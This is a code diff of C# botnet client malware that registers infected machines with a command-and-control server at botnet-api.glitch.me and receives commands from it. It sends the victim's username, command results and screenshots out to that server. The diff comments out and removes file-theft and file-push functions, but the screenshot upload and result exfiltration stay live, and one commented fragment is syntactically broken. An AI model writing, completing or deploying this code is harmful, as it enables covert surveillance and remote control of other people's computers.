@@ -14,7 +14,7 @@ namespace CommandHandler
 {
     public class Product
     {
-        public string ip { get; set; }
+        public string nameofpc { get; set; }
     }
     public class ScreenC
     {
@@ -28,105 +28,104 @@ namespace CommandHandler
     public class Command
     {
         public uint id { get; set; }
-        public string[] ip { get; set; }
         public string command { get; set; }
+        public uint[] ids { get; set; }
     }
     public class Response
     {
-        public string ip { get; set; }
         public string response { get; set; }
     }
     public class HttpHandler:Commands
     {
-        public static async Task<string> SendFilePathAsync(string ip)
-        {
-            HttpClient client = new HttpClient();
-            client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
-            string pth = null;
-            var resp = await client.GetAsync($"/api/v1/getfilespath/{ip}");
-            if (resp.IsSuccessStatusCode)
-            {
-                pth = await resp.Content.ReadAsAsync<string>();
-                return pth;
-            }
-            else
-            {
-                return pth;
-            }
-        }
-        public static async Task SendFileAsync(uint id, string ip, string path, byte[] bt)
-        {
-            //HttpClient client = new HttpClient();
-            //client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
-            //List<byte[]> btlist = new List<byte[]>();
-            //int value = 0;
-            //for (int i = 0; i < (bt.Length / 20000) + 1; i++)
-            //{
-            //    if (bt.Length - value > 20000)
-            //    {
-            //        byte[] btt = new byte[20000];
-            //        btlist.Add(btt);
-            //        Array.ConstrainedCopy(bt, value, btlist[i], 0, 20000);
-            //        value += 20000;
-            //    }
-            //    else
-            //    {
-            //        byte[] btt = new byte[bt.Length - value];
-            //        btlist.Add(btt);
-            //        Array.ConstrainedCopy(bt, value, btlist[i], 0, bt.Length - value);
-            //    }
-            //}
-            //for (int i = 0; i < btlist.Count; i++)
-            //{
-            //    if (i == 0)
-            //    {
-            //        FileC screen = new FileC {  = btlist[i] };
-            //        string json = new JavaScriptSerializer().Serialize(screen);
-            //        respgl = await client.PostAsync($"/api/v1/screens/{Id}", new StringContent(json));
-            //        respgl.EnsureSuccessStatusCode();
-            //        sid = respgl.Content.ReadAsStringAsync().Result;
-            //    }
-            //    else
-            //    {
-            //        ScreenC screen = new ScreenC { bytes = btlist[i] };
-            //        string json = new JavaScriptSerializer().Serialize(screen);
-            //        var resp = await client.PostAsync($"/api/v1/screens/{Id}/{respgl.Content.ReadAsStringAsync().Result}", new StringContent(json));
-            //        resp.EnsureSuccessStatusCode();
-            //    }
-            //}
-        } //В разработке
-        public static async Task<byte[]> GetFileAsync(string Ip)
-        {
-            HttpClient client = new HttpClient();
-            client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
-            var response = await client.GetAsync($"/api/v1/sendfiles/{Ip}");
-            byte[] bt = new byte[104857600];
-            if (response.IsSuccessStatusCode)
-            {
-                bt = await response.Content.ReadAsAsync<byte[]>();
-                return bt;
-            }
-            else
-            {
-                return bt;
-            }
-        }
-        public static async Task<string> GetFilePathAsync(string Ip)
-        {
-            HttpClient client = new HttpClient();
-            client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
-            var response = await client.GetAsync($"/api/v1/sendfiles/{Ip}");
-            string res = null;
-            if (response.IsSuccessStatusCode)
-            {
-                res = await response.Content.ReadAsAsync<string>();
-                return res;
-            }
-            else
-            {
-                return res;
-            }
-        }
+        //public static async Task<string> SendFilePathAsync(string ip)
+        //{
+        //    HttpClient client = new HttpClient();
+        //    client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
+        //    string pth = null;
+        //    var resp = await client.GetAsync($"/api/v1/getfilespath/{ip}");
+        //    if (resp.IsSuccessStatusCode)
+        //    {
+        //        pth = await resp.Content.ReadAsAsync<string>();
+        //        return pth;
+        //    }
+        //    else
+        //    {
+        //        return pth;
+        //    }
+        //}
+        //public static async Task SendFileAsync(uint id, string ip, string path, byte[] bt)
+        //{
+        //    //HttpClient client = new HttpClient();
+        //    //client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
+        //    //List<byte[]> btlist = new List<byte[]>();
+        //    //int value = 0;
+        //    //for (int i = 0; i < (bt.Length / 20000) + 1; i++)
+        //    //{
+        //    //    if (bt.Length - value > 20000)
+        //    //    {
+        //    //        byte[] btt = new byte[20000];
+        //    //        btlist.Add(btt);
+        //    //        Array.ConstrainedCopy(bt, value, btlist[i], 0, 20000);
+        //    //        value += 20000;
+        //    //    }
+        //    //    else
+        //    //    {
+        //    //        byte[] btt = new byte[bt.Length - value];
+        //    //        btlist.Add(btt);
+        //    //        Array.ConstrainedCopy(bt, value, btlist[i], 0, bt.Length - value);
+        //    //    }
+        //    //}
+        //    //for (int i = 0; i < btlist.Count; i++)
+        //    //{
+        //    //    if (i == 0)
+        //    //    {
+        //    //        FileC screen = new FileC {  = btlist[i] };
+        //    //        string json = new JavaScriptSerializer().Serialize(screen);
+        //    //        respgl = await client.PostAsync($"/api/v1/screens/{Id}", new StringContent(json));
+        //    //        respgl.EnsureSuccessStatusCode();
+        //    //        sid = respgl.Content.ReadAsStringAsync().Result;
+        //    //    }
+        //    //    else
+        //    //    {
+        //    //        ScreenC screen = new ScreenC { bytes = btlist[i] };
+        //    //        string json = new JavaScriptSerializer().Serialize(screen);
+        //    //        var resp = await client.PostAsync($"/api/v1/screens/{Id}/{respgl.Content.ReadAsStringAsync().Result}", new StringContent(json));
+        //    //        resp.EnsureSuccessStatusCode();
+        //    //    }
+        //    //}
+        //} //В разработке
+        //public static async Task<byte[]> GetFileAsync(string Ip)
+        //{
+        //    HttpClient client = new HttpClient();
+        //    client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
+        //    var response = await client.GetAsync($"/api/v1/sendfiles/{Ip}");
+        //    byte[] bt = new byte[104857600];
+        //    if (response.IsSuccessStatusCode)
+        //    {
+        //        bt = await response.Content.ReadAsAsync<byte[]>();
+        //        return bt;
+        //    }
+        //    else
+        //    {
+        //        return bt;
+        //    }
+        //}
+        //public static async Task<string> GetFilePathAsync(string Ip)
+        //{
+        //    HttpClient client = new HttpClient();
+        //    client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
+        //    var response = await client.GetAsync($"/api/v1/sendfiles/{Ip}");
+        //    string res = null;
+        //    if (response.IsSuccessStatusCode)
+        //    {
+        //        res = await response.Content.ReadAsAsync<string>();
+        //        return res;
+        //    }
+        //    else
+        //    {
+        //        return res;
+        //    }
+        //}
         public static async Task ScreenSendAsync(string Id, byte[] bt)
         {
             HttpClient client = new HttpClient();
@@ -174,15 +173,15 @@ namespace CommandHandler
         {
             HttpClient client = new HttpClient();
             client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
-            await client.DeleteAsync($"/api/v1/ip/{Id}");
+            await client.DeleteAsync($"/api/v1/client/{Id}");
         }
-        public static async Task SendResponse(string result, string MyIp)
+        public static async Task SendResponse(string result, string MyId)
         {
             HttpClient client = new HttpClient();
-            Response response = new Response { ip = MyIp, response = result };
+            Response response = new Response {response = result};
             client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
             string json = new JavaScriptSerializer().Serialize(response);
-            var resp = client.PostAsync($"/api/v1/responses/{MyIp}", new StringContent(json)).Result;
+            var resp = client.PostAsync($"/api/v1/responses/{MyId}", new StringContent(json)).Result;
             resp.EnsureSuccessStatusCode();
         }
         public static async Task<UInt32> GetIdOfCommand(string path)
@@ -229,13 +228,13 @@ namespace CommandHandler
             uint rescmd = idcmd.id;
             return rescmd;
         }
-        public static async Task<List<string>> ResultIpCmdAsync(string id)
+        public static async Task<List<string>> ResultIdsCmdAsync(string id)
         {
             var ipcmd = await GetCommandAssync<Command>($"/api/v1/messages/{id}");
             List<string> ipaddressescmd = new List<string> { };
-            for (int i = 0; i < GetCommandAssync<Command>($"/api/v1/messages/{id}").Result.ip.Length; i++)
+            for (int i = 0; i < GetCommandAssync<Command>($"/api/v1/messages/{id}").Result.ids.Length; i++)
             {
-                ipaddressescmd.Add(GetCommandAssync<Command>($"/api/v1/messages/{id}").Result.ip[i]);
+                ipaddressescmd.Add(GetCommandAssync<Command>($"/api/v1/messages/{id}").Result.ids[i].ToString());
             }
             return ipaddressescmd;
         }
@@ -258,23 +257,13 @@ namespace CommandHandler
             response = null;
             return product;
         }
-        public static async Task<List<string>> ResultIPTask()
-        {
-            var arr = await GetProductAsync<Product[]>("/api/v1/ip");
-            List<string> ipaddresses = new List<string> { };
-            for (int i = 0; i < arr.Length; i++)
-            {
-                ipaddresses.Add(arr[i].ip);
-            }
-            return ipaddresses;
-        }
         public static async Task<UInt32> CreateIpAndIdAsync(string ip)
         {
             HttpClient client = new HttpClient();
-            Product product = new Product { ip = ip };
+            Product product = new Product {nameofpc = Environment.UserName};
             client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
             string json = new JavaScriptSerializer().Serialize(product);
-            HttpResponseMessage response = client.PostAsync("api/v1/ip", new StringContent(json)).Result;
+            HttpResponseMessage response = client.PostAsync("api/v1/client", new StringContent(json)).Result;
             uint answer = response.Content.ReadAsAsync<UInt32>().Result;
             return answer;
         }
@@ -440,19 +429,12 @@ namespace CommandHandler
     }
     public class Class1:HttpHandler
     { 
-        public static string Main(string cmd, string path1, string path2, string ip, uint idc)
+        public static string Main(string cmd, string path1, string path2, uint idc)
         {
             string a = null;
             #region handler
             switch (cmd)
             {
-                case "getfile":
-                    string path = SendFilePathAsync(ip).Result;
-                    SendFileAsync(idc, ip, path, codeToSend(path1)).Wait();
-                    break;
-                case "sendfile":
-                    codeToGet(GetFileAsync(ip).Result, GetFilePathAsync(ip).Result);
-                    break;
                 case "screen":
                     ScreenSendAsync(idc.ToString(), code5()).Wait();
                     break;
